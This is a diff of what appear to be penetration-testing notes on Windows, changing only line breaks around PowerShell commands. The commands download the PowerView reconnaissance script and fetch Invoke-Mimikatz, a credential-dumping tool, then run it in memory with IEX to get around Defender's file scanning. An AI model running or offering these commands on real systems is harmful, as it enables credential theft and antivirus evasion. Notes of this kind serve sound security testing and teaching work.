@@ -38,10 +38,7 @@ Malicious files can be detected by Defender:
 
 ```bash
 PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
-
-PS C:\users\public\downloads> wget 
-'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -o PowerView_wget.ps1
-
+PS C:\users\public\downloads> wget 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -o PowerView_wget.ps1
 PS C:\users\public\downloads> curl 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -o PowerView_curl.ps1
 ```
 
@@ -57,7 +54,6 @@ Then load into memory:
 
 ```bash
 PS C:\users\public\downloads> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
-
 PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
 ```
 
